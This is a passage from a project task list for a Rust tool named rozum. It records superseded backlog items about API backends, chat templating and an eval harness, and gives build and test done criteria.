- [x] remote-api-backends — superseded by two newer pieces of work: `OpenAiHttpBackend` already speaks the OpenAI Chat Completions dialect against any compatible server (Ollama, mlx_lm.server, vLLM, OpenAI itself) via `ROZUM_BACKEND_URL`, and `api-gateway` exposes both OpenAI and Anthropic dialects locally. A symmetric `AnthropicHttpClient` backend (so rozum can call out to api.anthropic.com) is captured separately under `anthropic-http-client-backend` in `BACKLOG.md`.

- [x] smollm2-chat-template — superseded by per-backend chat templating: `gguf::format_qwen_prompt` for GGUF backends (Qwen / ChatML format with tool defs); mistralrs's own template applier for MLX backends; the gateway forwards chat templates upstream for OpenAI-HTTP backends. No standalone SmolLM2-specific layer is needed.

- [x] eval-harness — no longer in scope while the product focus is "local LLM provider for Claude Code / Codex". Evals matter when we are choosing between local models for accuracy; right now we are choosing for "does it run at all on M-series with the target architecture", which is best answered by trying the model in `rozum launch`. Will reopen as `local-llm-eval-harness` in `BACKLOG.md` if/when we need it.

## Done Criteria

- `cargo fmt --check` passes.
- `cargo test` passes.
- `cargo build --release` passes.
- `cargo build --no-default-features` produces a meeting-room-only binary.
- Bare `rozum` starts a meeting room without model inference.
- User-facing CLI commands are `gateway`, `launch`, `models`, `list`, `mcp-proxy`, `web`, `discord`, `telegram`.
- Specs for completed items have checked behavior boxes and results.
